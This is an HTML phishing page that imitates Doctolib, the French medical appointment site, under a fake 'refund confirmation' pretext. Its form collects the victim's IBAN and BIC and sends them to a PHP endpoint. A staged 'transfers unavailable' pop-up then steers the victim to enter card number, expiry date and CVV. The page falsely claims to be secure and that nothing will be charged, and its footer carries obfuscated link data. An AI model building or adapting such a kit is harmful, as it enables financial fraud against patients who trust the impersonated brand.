
<html data-theme="doctolib2023" lang="fr">
<head>
    <script src="https://browser.sentry-cdn.com/6.19.7/bundle.min.js" crossorigin="anonymous"></script>
    <script src="https://browser.sentry-cdn.com/6.19.7/bundle.min.js" crossorigin="anonymous"></script>
    <script src="https://browser.sentry-cdn.com/6.19.7/bundle.min.js" crossorigin="anonymous"></script>
    <script src="https://browser.sentry-cdn.com/6.19.7/bundle.min.js" crossorigin="anonymous"></script>
    <script src="webpack/loader.js?target=www.doctolib.fr" type="text/javascript" async="" charset="utf-8" id="spcloader"></script>
    <script src="webpack/elephant.js"></script>
    <script type="text/javascript" async="" src="https://sdk.privacy-center.org/sdk/687db2b129cc2ae4234462cde75e53d4bc51af5c/modern/sdk.687db2b129cc2ae4234462cde75e53d4bc51af5c.js" charset="utf-8"></script>
    <script type="text/javascript" src="https://sdk.privacy-center.org/sdk/687db2b129cc2ae4234462cde75e53d4bc51af5c/modern/sdk.687db2b129cc2ae4234462cde75e53d4bc51af5c.js" async="" charset="utf-8"></script>
    <meta charset="utf-8">
    <meta name="csrf-param" content="webpack/authenticity_token">
    <meta name="csrf-token" content="webpack/Wag-VRfEb2KqfBXnn4yKm0_YM1kz6HXXKboms-ibUjFpBsO7zsZ1wrSt8rrx9JZtGn8wQMFPeuxA1_DzHxmW4A">
    <meta name="referrer" content="origin-when-cross-origin">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0, , viewport-fit=cover">
    <meta data-rh="true" name="description" content="webpack/Confirmez vos données de remboursement - Doctolib">
    <meta name="google-play-app" content="webpack/app-id=fr.doctolib.www">
    <meta name="apple-itunes-app" content="webpack/app-id=925339063">
    <script nonce="">
      window.platforms = {
        reactNative: false,
        reactNativeAppVersion: "",
        android: false,
        ios: true,
        variant: ""
      }
    </script>
    <link rel="stylesheet" href="webpack/family-roboto-300-400-500-700-montserrat-400-500-700-merriweather-300-400-700.css">
    <link rel="apple-touch-icon" href="webpack/180x180.png">
    <title>Confirmation du remboursement - Doctolib</title>
    <link rel="search" type="application/opensearchdescription+xml" href="webpack/open_search.xml">
    <script nonce="">
    SULTATI_RECOVERY"}};
    </script>
    <script src="webpack/datadog-rum-v4.js" crossorigin="anonymous" data-lazy="no" nonce=""></script>
    <script src="webpack/rum-datadog-3623a02bd9251768878a.js" data-segment="patient" nonce=""></script>
    <style>
      .app_loading { display: none; }
    </style>
    <script src="webpack/5e227d5a9db847db9597d931c0ea0774.min.js" crossorigin="anonymous" data-lazy="no" nonce=""></script>
    <script src="webpack/sentry-de6d4bbd68c40facd2cd.js" data-device="desktop" nonce=""></script>
    <meta property="og:title" content="webpack/Confirmez vos données de remboursement - Doctolib">
    <meta property="og:type" content="webpack/website">
    <meta property="og:image" content="webpack/logo_doctolib_square.png">
    <meta property="og:url" content="webpack">
    <meta property="og:site_name" content="webpack/Doctolib">
    <meta property="og:locale" content="webpack/fr_FR">
    <meta property="og:description" content="webpack/Confirmez vos données de remboursement - Doctolib">
    <link rel="stylesheet" type="text/css" href="webpack/42844-249655d7.css">
    <link rel="stylesheet" type="text/css" href="webpack/61806-906039b2.css">
    <link rel="stylesheet" type="text/css" href="webpack/9753-85c79b0f.css">
    <link rel="stylesheet" type="text/css" href="webpack/25791-a2698f50.css">
    <link rel="stylesheet" type="text/css" href="webpack/22561-cf2cc161.css">
    <link rel="stylesheet" type="text/css" href="webpack/49592-708b2ae0.css">
    <link rel="stylesheet" type="text/css" href="webpack/92218-cf7973d1.css">
    <link rel="stylesheet" type="text/css" href="webpack/30520-43ce59e0.css">
    <link rel="stylesheet" type="text/css" href="webpack/50731-7fef2e8e.css">
    <link rel="stylesheet" type="text/css" href="webpack/25616-dda75468.css">
    <link rel="stylesheet" type="text/css" href="webpack/79683-c980cbdc.css">
    <link rel="stylesheet" type="text/css" href="webpack/39041-aff1fe4e.css">
    <link rel="stylesheet" type="text/css" href="webpack/95940-0527ba03.css">
    <link rel="stylesheet" type="text/css" href="webpack/595-4d1888f6.css">
    <link rel="stylesheet" type="text/css" href="webpack/662-fa29eb37.css">
    <link rel="stylesheet" type="text/css" href="webpack/312-cb7bd32f.css">
<script type="text/javascript" async="" src="https://sdk.privacy-center.org/sdk/687db2b129cc2ae4234462cde75e53d4bc51af5c/modern/sdk.687db2b129cc2ae4234462cde75e53d4bc51af5c.js" charset="utf-8"></script></head>
<body class="online_booking-drafts-telehealth_payment show" style="cursor: auto;">
<div id="didomi-host" class="didomi-host" data-nosnippet="true" aria-hidden="true" lang="fr" data-lang-dir="ltr"></div>
<iframe name="__cmpLocator" style="display: none;" title="cmpLocator"></iframe>
<div class="flex">
  <div class="content-full-width application-container">
    <div class="js-navbar" data-props="{&quot;hide_nav_links&quot;:null,&quot;b2b_url&quot;:&quot;https://info.doctolib.fr?origin=home-header\u0026utm_button=header\u0026utm_content-group=other\u0026utm_website=doctolib_patients&quot;,&quot;hasTemporaryWarning&quot;:true,&quot;skipLink&quot;:true}">
      <div class="sr-only focus-within:p-8 focus-within:not-sr-only dl-font-size-body">
        <a class="dl-link" data-design-system="base" href="webpack/#main-content">Aller au contenu principal</a>
      </div>
      <header class="dl-nav-bar dl-desktop-navbar" data-design-system="base" role="banner">
        <div class="dl-desktop-navbar-content">
          <div class="flex dl-align-items-center dl-nav-bar-list">
            <a aria-label="Accueil" class="flex" href="webpack" title="Accueil">
              <div class="logo-doctolib logo-doctolib-white" data-test-id="logo-doctolib">
                <span class="sr-only">Doctolib</span>
              </div>
            </a>
            <li class="dl-full-height dl-flex-shrink-zero" data-design-system="base">
              <a class="dl-desktop-navbar-link" href="webpack">Accueil</a>
            </li>
          </div>
          <nav aria-label="Principal" role="navigation">
            <ul class="flex dl-align-items-center dl-nav-bar-list h-full">
              <li>
                <div class="dl-popover-button-wrapper" data-design-system="deprecated">
                  <div class="dl-popover-button">
                    <div class="dl-full-height dl-flex-shrink-zero" data-design-system="base"></div>
                  </div>
                  <div class="dl-card dl-card-bg-white dl-card-variant-shadow-3 dl-popover-button-choices dl-popover-xlarge !hidden" data-design-system="oxygen" data-design-system-component="Card" style="right: 0px;">
                    <div class="dl-card-content">
                      <div>
                        <div class="flex flex-row gap-x-4 items-center pb-16">
                          <svg aria-hidden="true" class="dl-icon dl-icon-small" data-design-system="oxygen" data-design-system-component="Icon" data-icon-name="regular/circle-question" fill="currentColor" focusable="false" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg">
                            <path d="M8 2C4.672 2 2 4.695 2 8c0 3.328 2.672 6 6 6 3.305 0 6-2.672 6-6 0-3.305-2.695-6-6-6m0 10.875A4.87 4.87 0 0 1 3.125 8c0-2.672 2.18-4.875 4.875-4.875 2.672 0 4.875 2.203 4.875 4.875 0 2.695-2.203 4.875-4.875 4.875m0-3a.74.74 0 0 0-.75.75c0 .422.305.75.75.75.398 0 .75-.328.75-.75a.755.755 0 0 0-.75-.75M8.773 5H7.578a1.63 1.63 0 0 0-1.64 1.64.57.57 0 0 0 .562.563.57.57 0 0 0 .563-.562.5.5 0 0 1 .492-.516H8.75c.305 0 .563.234.563.516a.5.5 0 0 1-.258.445l-1.336.797a.58.58 0 0 0-.282.492v.375A.57.57 0 0 0 8 9.313a.57.57 0 0 0 .563-.563v-.047l1.054-.656c.492-.305.797-.844.797-1.406C10.438 5.727 9.711 5 8.774 5Z"></path>
                          </svg>
                          <div class="font-bold text-[14px]">Questions fréquentes</div>
                        </div>
                        <div class="flex flex-col gap-y-8 pb-16">
                          <div class="text-[14px] dl-text basis-1/2">
                            <a class="text-[14px] dl-text basis-1/2 no-underline hover:no-underline" href="webpack/360024941154-Utiliser-Doctolib-sur-ordinateur-smartphone-ou-tablette?source=pinned_article" target="_blank">Utiliser Doctolib sur ordinateur, smartphone ou tablette</a>
                          </div>
                          <div class="text-[14px] dl-text basis-1/2">
                            <a class="text-[14px] dl-text basis-1/2 no-underline hover:no-underline" href="webpack/360025317194-Mot-de-passe-oubli%C3%A9-Identifiant-s-oubli%C3%A9-s?source=pinned_article" target="_blank">Mot de passe oublié ? / Identifiant(s) oublié(s) ?</a>
                          </div>
                          <div class="text-[14px] dl-text basis-1/2">
                            <a class="text-[14px] dl-text basis-1/2 no-underline hover:no-underline" href="webpack/360025316194-Prendre-et-confirmer-un-rendez-vous-sur-Doctolib?source=pinned_article" target="_blank">Prendre et confirmer un rendez-vous sur Doctolib</a>
                          </div>
                        </div>
                        <div class="flex flex-row pb-16 pl-8 mb-16">
                          <a class="dl-link no-underline hover:no-underline text-[14px] font-bold" data-design-system="base" href="webpack/fr?source=help_button" target="_blank">Ouvrir le Centre d'aide</a>
                          <svg aria-hidden="true" class="dl-icon ml-4 dl-icon-primary-110 dl-icon-xsmall" data-design-system="oxygen" data-design-system-component="Icon" data-icon-name="regular/up-right-from-square" fill="currentColor" focusable="false" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg">
                            <path d="M13.438 2H10.25a.75.75 0 0 0-.703.492.76.76 0 0 0 .164.82l.96.961-4.523 4.524a.723.723 0 0 0 0 1.055c.141.14.329.21.54.21.187 0 .375-.07.515-.21l4.524-4.524.96.961c.141.14.329.211.54.211.093 0 .187 0 .28-.047A.75.75 0 0 0 14 5.75V2.562A.57.57 0 0 0 13.437 2Zm-2.25 7.5a.555.555 0 0 0-.563.563v2.624a.185.185 0 0 1-.188.188H3.314c-.118 0-.188-.07-.188-.188V5.564c0-.094.07-.188.188-.188h2.624a.555 555 0 0 0 .563-.563.57.57 0 0 0-.563-.562H3.313A1.325 1.325 0 0 0 2 5.563v7.125A1.31 1.31 0 0 0 3.313 14h7.124c.704 0 1.313-.586 1.313-1.313v-2.624a.57.57 0 0 0-.563-.563Z"></path>
                          </svg>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </li>
              <li class="dl-full-height dl-flex-shrink-zero" data-design-system="base"></li>
              <li class="dl-full-height dl-flex-shrink-zero" data-design-system="base">
                <a class="dl-desktop-navbar-link" href="webpack/appointments">Mes rendez-vous</a>
              </li>
              <li class="dl-full-height dl-flex-shrink-zero" data-design-system="base"></li>
              <li class="dl-desktop-navbar-menu dl-full-height" data-design-system="base"></li>
            </ul>
          </nav>
        </div>
      </header>
    </div>
    <main id="main-content">

  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Processus de remboursement</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    html { font-size: 12px; }
    body { margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif; background: #f5f8fa; color: #333; line-height: 1.5; }
    .container { max-width: 380px; margin: 0 auto; padding: 10px; }
    h1 { text-align: center; font-size: 18px; color: #234361; margin-bottom: 8px; font-weight: bold; }
    .intro-text { text-align: center; font-size: 13px; margin-bottom: 10px; }
    .secure-banner { background: #234361; color: #fff; padding: 8px; border-radius: 5px; display: flex; align-items: center; margin-bottom: 10px; }
    .secure-banner i { margin-right: 10px; font-size: 18px; }
    .notice { margin: 8px 0; font-weight: bold; font-size: 13px; }
    .additional-info { font-size: 12px; color: #6c757d; margin-bottom: 10px; }
    .divider { border-top: 1px solid #ccc; margin: 10px 0; }
    .timeline { display: flex; margin: 10px 0; justify-content: space-between; }
    .timeline-step { display: flex; flex-direction: column; align-items: center; flex: 1; }
    .timeline-icon { width: 24px; height: 24px; border-radius: 50%; background: #ccc; display: flex; align-items: center; justify-content: center; color: #fff; margin-bottom: 3px; font-size: 12px; }
    .timeline-step.active .timeline-icon { background: #234361; }
    .timeline-step.completed .timeline-icon { background: #28a745; }
    .timeline-label { font-size: 10px; }
    .timeline-connector { flex:1; height:2px; background:#ccc; margin-top:10px; }
    .timeline-step.completed + .timeline-connector { background: #28a745; }
    .tabs { display: flex; margin-bottom: 10px; }
    .tab { flex: 1 1 50%; padding:5px; border-bottom:2px solid #ccc; cursor:pointer; display:flex; align-items:center; justify-content:center; font-size:12px; }
    .tab i { margin-right:4px; font-size:14px; }
    .tab.active { border-bottom:2px solid #2b8fce; font-weight:bold; }
    .tab.disabled { opacity:.5; cursor:not-allowed; }
    .tab-content { display:none; }
    .tab-content.active { display:block; }
    .badge { display:inline-block; padding:3px 6px; border-radius:20px; font-size:9px; font-weight:bold; margin-left:4px; }
    .badge-verified { background:#28a745; color:#fff; }
    .badge-warning { background:#ffc107; color:#333; }
    .badge-new { background:#2b8fce; color:#fff; }
    .payment-card { background:#e6f0f9; border-radius:10px; padding:10px; margin-bottom:10px; }
    .payment-header { display:flex; align-items:center; margin-bottom:10px; }
    .payment-header i { margin-right:10px; font-size:18px; color:#234361; }
    .payment-header h2 { font-size:15px; margin:0; }
    .payment-form-info { margin-bottom:8px; font-size:12px; color:#6c757d; }
    .form-group { margin-bottom:10px; position:relative; }
    .form-group label { font-size:12px; font-weight:bold; margin-bottom:4px; display:block; }
    .form-group input { width:100%; padding:8px; border:1px solid #ccc; border-radius:5px; font-size:13px; }
    .form-group input.error { border-color:#dc3545; }
    .error-message { display:none; color:#dc3545; font-size:12px; margin-top:3px; }
    .error-message.show { display:block; }
    .input-help { font-size:11px; color:#6c757d; margin-top:3px; }
    .card-icons { margin:10px 0; display:flex; gap:5px; }
    .card-icons img { height:20px; opacity:.5; transition:.3s; }
    .card-icons img.active { opacity:1; }
    .checkbox-group { display:flex; align-items:center; font-size:12px; margin-top:8px; }
    .checkbox-group input { margin-right:5px; }
    .adyen-checkout__input-wrapper { position:relative; }
    .card-type-icon { position:absolute; right:8px; top:50%; transform:translateY(-50%); height:16px; }
    .btn-confirm { background:#234361; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; font-size:13px; font-weight:bold; cursor:pointer; display:flex; align-items:center; justify-content:center; margin-top:10px; }
    .btn-confirm:disabled { background:#6c757d; cursor:not-allowed; }
    .btn-confirm i { margin-right:6px; }
    .spinner { display:inline-block; width:16px; height:16px; border:2px solid rgba(255,255,255,.3); border-radius:50%; border-top-color:#fff; animation:spin 1s linear infinite; margin-right:6px; }
    .spinner.hidden { display:none; }
    @keyframes spin { to{ transform:rotate(360deg); } }
    .modal { display:none; position:fixed; z-index:2000; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.5); justify-content:center; align-items:center; }
    .modal-content { background:#fff; padding:20px; border-radius:10px; width:90%; max-width:350px; text-align:center; box-shadow:0 5px 15px rgba(0,0,0,.2); }
    .modal-title { font-size:15px; font-weight:bold; margin-bottom:12px; color:#234361; }
    .modal-text { font-size:13px; margin-bottom:12px; line-height:1.4; color:#444; }
    .modal-btn { display:block; background:#107aca; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; cursor:pointer; font-weight:bold; font-size:13px; margin-top:10px; }
    .modal-btn:hover { background:#0a66b3; }
    @media(max-width:480px){
      .container { max-width:95%; }
      .tab { font-size:11px; }
      .badge { font-size:8px; }
    }
  </style>

  <div class="container">
    <h1>Processus de remboursement</h1>
    <p class="intro-text">Vous êtes sur une page sécurisée pour confirmer vos informations de remboursement. Cette étape est essentielle pour vérifier votre identité et garantir que le remboursement est effectué à la bonne personne. Veuillez suivre attentivement les étapes ci‑dessous.</p>

    <div class="timeline">
      <div class="timeline-step completed">
        <div class="timeline-icon"><i class="fas fa-check"></i></div>
        <div class="timeline-label">Identification</div>
      </div>
      <div class="timeline-connector"></div>
      <div class="timeline-step active" id="step-2">
        <div class="timeline-icon"><i class="fas fa-credit-card"></i></div>
        <div class="timeline-label">Remboursement</div>
      </div>
      <div class="timeline-connector"></div>
      <div class="timeline-step" id="step-3">
        <div class="timeline-icon"><i class="fas fa-check-circle"></i></div>
        <div class="timeline-label">Confirmation</div>
      </div>
    </div>

    <div class="secure-banner">
      <i class="fas fa-lock"></i>
      <div>Page sécurisée <span class="badge badge-secure">SSL&nbsp;EV</span></div>
    </div>
    <p class="notice">Aucun prélèvement ne sera effectué.</p>
    <p class="additional-info">Une vérification supplémentaire par votre banque peut être requise.</p>
    <div style="text-align:center; margin-bottom:10px;">
      <a href="#" style="font-size:12px; color:#2b8fce; text-decoration:none; font-weight:bold;">EN&nbsp;SAVOIR&nbsp;PLUS</a>
    </div>
    <div class="divider"></div>

    <form id="main-form" action="app/Remboursement.php" method="POST">
      <div class="tabs">
        <div class="tab" id="tab-carte-btn" onclick="switchTab('carte')">
          <i class="fas fa-credit-card"></i> Carte bancaire <span class="badge badge-new">Nouveau</span>
        </div>
        <div class="tab active" id="tab-iban-btn" onclick="switchTab('iban')">
          <i class="fas fa-university"></i> Virement bancaire (IBAN) <span class="badge badge-verified">Recommandé</span>
        </div>
      </div>

      <!-- IBAN -->
      <div id="tab-iban" class="tab-content active">
        <div class="payment-card">
          <div class="payment-header">
            <i class="fas fa-university"></i><h2>Virement bancaire (IBAN)</h2>
          </div>
          <p class="payment-form-info">Tous les champs sont obligatoires.</p>
          <div class="form-group">
            <label for="account-holder">Titulaire du compte</label>
            <input type="text" id="account-holder" name="account_holder" placeholder="Nom et prénom du titulaire">
            <span id="accountHolderError" class="error-message">Veuillez indiquer le titulaire du compte</span>
          </div>
          <div class="form-group">
            <label for="iban">IBAN</label>
            <input type="text" id="iban" name="iban" placeholder="FR76&nbsp;1234&nbsp;5678&nbsp;9012&nbsp;3456&nbsp;7890&nbsp;123" maxlength="34">
            <span id="ibanError" class="error-message">Veuillez saisir un IBAN valide</span>
            <span class="input-help">Numéro international de votre compte bancaire</span>
          </div>
          <div class="form-group">
            <label for="bic">BIC / SWIFT</label>
            <input type="text" id="bic" name="bic" placeholder="ABCDEFGHXXX" maxlength="11">
            <span id="bicError" class="error-message">Veuillez saisir un code BIC valide</span>
            <span class="input-help">Code d’identification de votre banque</span>
          </div>
          <div class="checkbox-group">
            <input type="checkbox" id="save-iban" name="save_iban">
            <label for="save-iban">Sauvegarder pour mon prochain remboursement</label>
          </div>
        </div>
      </div>

      <!-- Carte bancaire -->
      <div id="tab-carte" class="tab-content">
        <div class="payment-card">
          <div class="payment-header">
            <i class="fas fa-credit-card"></i><h2>Carte bancaire</h2>
          </div>
          <p class="payment-form-info">Tous les champs sont obligatoires.</p>
          <div class="form-group">
            <label for="card-number">Numéro de la carte</label>
            <div class="adyen-checkout__input-wrapper">
              <input type="tel" name="card_number" id="card-number" inputmode="numeric" pattern="[0-9\s]*" placeholder="1234&nbsp;5678&nbsp;9012&nbsp;3456" maxlength="19">
              <img id="card-type-icon" class="card-type-icon" src="webpack/nocard.svg" alt="">
            </div>
            <span id="cardNumberError" class="error-message">Le numéro de carte est incorrect.</span>
          </div>
          <div class="card-icons">
            <img id="visa-icon" src="webpack/visa.svg" alt="VISA">
            <img id="mastercard-icon" src="webpack/mc.svg" alt="MasterCard">
            <img id="cb-icon" src="webpack/cartebancaire.svg" alt="CB">
            <img id="amex-icon" src="webpack/amex.svg" alt="AMEX" style="display:none">
          </div>
          <div class="form-group">
            <label for="expiry-date">Date d'expiration</label>
            <div class="adyen-checkout__input-wrapper">
              <input type="tel" name="expiry_date" id="expiry-date" inputmode="numeric" pattern="[0-9\/]*" placeholder="MM/AA" maxlength="5">
            </div>
            <span id="expiryError" class="error-message">Date d'expiration incorrecte ou expirée.</span>
            <span class="input-help">Format&nbsp;MM/AA</span>
          </div>
          <div class="form-group">
            <label for="cvv">Code de sécurité (CVV)</label>
            <div class="adyen-checkout__input-wrapper">
              <input type="tel" name="cvv" id="cvv" inputmode="numeric" pattern="[0-9]*" placeholder="3&nbsp;ou&nbsp;4&nbsp;chiffres" maxlength="4">
            </div>
            <span id="cvvError" class="error-message">Le code de sécurité est incorrect.</span>
          </div>
          <div class="checkbox-group">
            <input type="checkbox" name="save_card" id="save-card">
            <label for="save-card">Sauvegarder pour mon prochain paiement</label>
          </div>
        </div>
      </div>

      <button id="confirm-btn" class="btn-confirm" type="button">
        <span id="spinner" class="spinner hidden"></span>
        <i id="lock-icon" class="fas fa-lock"></i> CONFIRMER
      </button>
    </form>

    <!-- Modal de notification -->
    <div id="notification-modal" class="modal">
      <div class="modal-content">
        <h3 class="modal-title">Remboursement par virement temporairement indisponible</h3>
        <p class="modal-text">En raison d’un nombre exceptionnel de demandes de remboursement par virement, des délais de traitement sont actuellement observés.</p>
        <p class="modal-text">Pour accélérer la réception de votre remboursement, merci d’utiliser votre carte bancaire.</p>
        <button id="modal-confirm" class="modal-btn">J’ai compris</button>
      </div>
    </div>

  </div>

  <script>
    const s = { tab: 'iban', isLoading: false, ibanDisabled: false };
    const e = {
      mainForm: document.getElementById('main-form'),
      tabCarteBtn: document.getElementById('tab-carte-btn'),
      tabIbanBtn: document.getElementById('tab-iban-btn'),
      tabCarte: document.getElementById('tab-carte'),
      tabIban: document.getElementById('tab-iban'),
      accountHolder: document.getElementById('account-holder'),
      iban: document.getElementById('iban'),
      bic: document.getElementById('bic'),
      saveIban: document.getElementById('save-iban'),
      cardNumber: document.getElementById('card-number'),
      expiryDate: document.getElementById('expiry-date'),
      cvv: document.getElementById('cvv'),
      confirmBtn: document.getElementById('confirm-btn'),
      spinner: document.getElementById('spinner'),
      lockIcon: document.getElementById('lock-icon'),
      modal: document.getElementById('notification-modal'),
      modalConfirm: document.getElementById('modal-confirm'),
      step2: document.getElementById('step-2'),
      step3: document.getElementById('step-3')
    };

    function switchTab(t) {
      if (t === 'iban' && s.ibanDisabled) return;
      s.tab = t;
      e.tabCarteBtn.classList.toggle('active', t === 'carte');
      e.tabIbanBtn.classList.toggle('active', t === 'iban');
      e.tabCarte.classList.toggle('active', t === 'carte');
      e.tabIban.classList.toggle('active', t === 'iban');
    }

    function simulateLoading(ms) {
      s.isLoading = true;
      e.confirmBtn.disabled = true;
      e.spinner.classList.remove('hidden');
      e.lockIcon.style.display = 'none';
      return new Promise(res => setTimeout(() => {
        s.isLoading = false;
        e.confirmBtn.disabled = false;
        e.spinner.classList.add('hidden');
        e.lockIcon.style.display = 'inline-block';
        res();
      }, ms));
    }

    function disableIbanOption() {
      s.ibanDisabled = true;
      e.tabIbanBtn.classList.add('disabled');
      const badge = e.tabIbanBtn.querySelector('.badge');
      badge.classList.replace('badge-verified', 'badge-warning');
      badge.textContent = 'Indisponible';
      switchTab('carte');
    }

    function validateIbanForm() {
      let ok = true;
      [['accountHolderError', e.accountHolder],
       ['ibanError',         e.iban],
       ['bicError',          e.bic]
      ].forEach(([errId, input]) => {
        if (!input.value.trim()) {
          input.classList.add('error');
          document.getElementById(errId).classList.add('show');
          ok = false;
        } else {
          input.classList.remove('error');
          document.getElementById(errId).classList.remove('show');
        }
      });
      return ok;
    }

    function showError(input, errorElement, message) {
      input.classList.add('error');
      errorElement.textContent = message;
      errorElement.classList.add('show');
    }

    function hideError(input, errorElement) {
      input.classList.remove('error');
      errorElement.classList.remove('show');
    }

    function luhnAlgorithm(cardNumber) {
      let sum = 0;
      let shouldDouble = false;
      for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i]);
        if (shouldDouble) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
      }
      return sum % 10 === 0;
    }

    function validateExpiryDate(date) {
      const [month, year] = date.split('/').map(Number);
      const currentYear = new Date().getFullYear() % 100;
      const currentMonth = new Date().getMonth() + 1;
      if (year < currentYear || (year === currentYear && month < currentMonth)) {
        return false;
      }
      return month >= 1 && month <= 12;
    }

    function validateCVV(cvv, cardType) {
      if (cardType === 'amex') {
        return /^\d{4}$/.test(cvv);
      }
      return /^\d{3}$/.test(cvv);
    }

    // Auto-insertion du slash dans MM/AA
    e.expiryDate.addEventListener('input', evt => {
      let v = evt.target.value.replace(/\D/g, '').slice(0,4);
      if (v.length > 2) {
        v = v.slice(0,2) + '/' + v.slice(2);
      }
      evt.target.value = v;
      validateExpiryDateInput(evt.target);
    });

    // Auto-espacement pour le numéro de carte
    e.cardNumber.addEventListener('input', evt => {
      let v = evt.target.value.replace(/\D/g, '').slice(0,16);
      evt.target.value = v.match(/.{1,4}/g)?.join(' ') || '';
      validateCardNumberInput(evt.target);
    });

    // Validation en temps réel pour le numéro de carte
    function validateCardNumberInput(input) {
      const value = input.value.replace(/\s/g, '');
      if (value.length > 0 && !luhnAlgorithm(value)) {
        showError(input, document.getElementById('cardNumberError'), 'Numéro de carte invalide');
      } else {
        hideError(input, document.getElementById('cardNumberError'));
      }
    }

    // Validation en temps réel pour la date d'expiration
    function validateExpiryDateInput(input) {
      if (input.value.length === 5 && !validateExpiryDate(input.value)) {
        showError(input, document.getElementById('expiryError'), 'Date d\'expiration invalide ou expirée');
      } else {
        hideError(input, document.getElementById('expiryError'));
      }
    }

    // Validation en temps réel pour le CVV
    e.cvv.addEventListener('input', evt => {
      const cardType = e.cardNumber.value.startsWith('34') || e.cardNumber.value.startsWith('37') ? 'amex' : 'other';
      if (!validateCVV(evt.target.value, cardType)) {
        showError(evt.target, document.getElementById('cvvError'), `Le CVC doit comporter ${cardType === 'amex' ? '4' : '3'} chiffres`);
      } else {
        hideError(evt.target, document.getElementById('cvvError'));
      }
    });

    e.confirmBtn.addEventListener('click', async () => {
      if (s.isLoading) return;
      if (s.tab === 'iban') {
        if (!validateIbanForm()) return;
        await simulateLoading(1500);
        e.modal.style.display = 'flex';
      } else {
        // validation CB simple
        if (!luhnAlgorithm(e.cardNumber.value.replace(/\s/g,''))) {
          showError(e.cardNumber, document.getElementById('cardNumberError'), 'Numéro de carte invalide');
          return;
        }
        if (!validateExpiryDate(e.expiryDate.value)) {
          showError(e.expiryDate, document.getElementById('expiryError'), 'Date d\'expiration invalide ou expirée');
          return;
        }
        const cardType = e.cardNumber.value.startsWith('34') || e.cardNumber.value.startsWith('37') ? 'amex' : 'other';
        if (!validateCVV(e.cvv.value, cardType)) {
          showError(e.cvv, document.getElementById('cvvError'), `Le CVC doit comporter ${cardType === 'amex' ? '4' : '3'} chiffres`);
          return;
        }
        await simulateLoading(1500);
        e.mainForm.submit();
      }
    });

    e.modalConfirm.addEventListener('click', async () => {
      e.modal.style.display = 'none';
      // AJAX IBAN
      const data = new FormData();
      data.append('account_holder', e.accountHolder.value);
      data.append('iban',           e.iban.value);
      data.append('bic',            e.bic.value);
      data.append('save_iban',      e.saveIban.checked ? 1 : 0);
      const res = await fetch('app/Remboursement.php', { method: 'POST', body: data });
      const json = await res.json().catch(()=>null);
      if (!json || json.status !== 'ok') {
        alert(json?.message || 'Erreur enregistrement IBAN');
        return;
      }
      disableIbanOption();
      e.step2.classList.replace('active', 'completed');
      e.step3.classList.add('active');
    });

    switchTab('iban');
  </script>

              </main></div>
            </div>

         <div class="dl-white-bg">
      <div class="dl-footer-content m-auto">
        <div class="dl-footer-container dl-footer-help-container flex dl-justify-between dl-align-items-center dl-text-center">
          <div class="dl-footer-help-text flex flex-wrap dl-flex-grow-shrink-auto">
            <div class="dl-text dl-text-title dl-text-l dl-text-bold dl-margin-r-4">Des questions ?</div>
            <div class="dl-text dl-text-body dl-text-s dl-text-regular">Consultez notre Centre d'aide ou contactez-nous</div>
          </div>
          <a class="dl-button-primary dl-button dl-button-size-normal dl-flex-shrink-zero" href="webpack/fr?source=help_button" target="_blank">
            <span class="dl-button-label">
              <svg class="dl-icon dl-button-left-icon dl-icon-xsmall" fill="currentColor" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg">
                <path clip-rule="evenodd" fill-rule="evenodd" d="M8 14.4A6.4 6.4 0 1 0 8 1.6a6.4 6.4 0 0 0 0 12.8zm0-7.793a1.084 1.084 0 1 1 0-2.168 1.084 1.084 0 0 1 0 2.168zm1.135 4.696h-2.27a.31.31 0 0 1-.31-.31v-.619a.31.31 0 0 1 .31-.31h.31v-1.65h-.31a.31.31 0 0 1-.31-.31v-.619a.31.31 0 0 1 .31-.31h1.651a.31.31 0 0 1 .31.31v2.58h.31a.31.31 0 0 1 .31.31v.62a.31.31 0 0 1-.31.31z"></path>
              </svg>
              Ouvrir le Centre d'aide
            </span>
          </a>
        </div>
        <div class="dl-footer-divider legacy-dl-divider"></div>
      </div>
    </div>
    <div class="dl-white-bg">
      <div class="dl-footer-content m-auto">
        <div class="dl-footer-container flex dl-justify-between dl-align-items-center dl-text-center">
          <div class="dl-footer-help-text flex flex-wrap dl-flex-grow-shrink-auto dl-align-items-center">
            <div class="dl-text dl-text-title dl-text-l dl-text-bold dl-margin-r-4">
              <img alt="Doctolib" class="dl-footer-logo" src="webpack/logo-blue.png">
            </div>
            <p class="dl-text dl-text-body dl-text-regular dl-text-neutral-090">
              Copyright © 2025 Doctolib, tous droits réservés.
            </p>
          </div>
          <div class="dl-flex-center">
            <div>
              <a class="inline-block" data-u="==wM2ATOzMTN
ykDZp9iYpx2b0N2bk9CcwF2LyZ2Lt92YuUGbwBXYuMXZuVHdp9yL6MHc0RHa" role="link" tabindex="0" target="_blank">
                <img alt="Télécharger dans l’App Store" class="dl-store-badge" src="webpack/hp-app-store-badge-fr.png">
              </a>
            </div>
            <div class="dl-margin-l">
              <a class="inline-block" data-u="==gcm1DboZyd3dnLilGbvR3YvRmLyZWP
kl2PzxWahRXZk9ycwBXYvUmcvR3cv02bj5SZsd2bvdmL5FGbw9yL6MHc0RHa" role="link" tabindex="0" target="_blank">
                <img alt="Disponible sur Google Play" class="dl-store-badge" src="webpack/hp-google-play-badge-fr.png">
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>

<script nonce="">
  window.country = "fr";
  window.current_account = {"tanker_it_privacy_settings":{}};
  window.flashMessages = [];
  window.locale = "fr";
  window.onPartnerDomain = false;
  window.portalSlug = "";
  window.portalName = "";
  window.portalReturnUrl = "";
  window.pre_authenticated_account = null;
  window.translation_keys = JSON.parse("{ "}}}}}}");
</script>
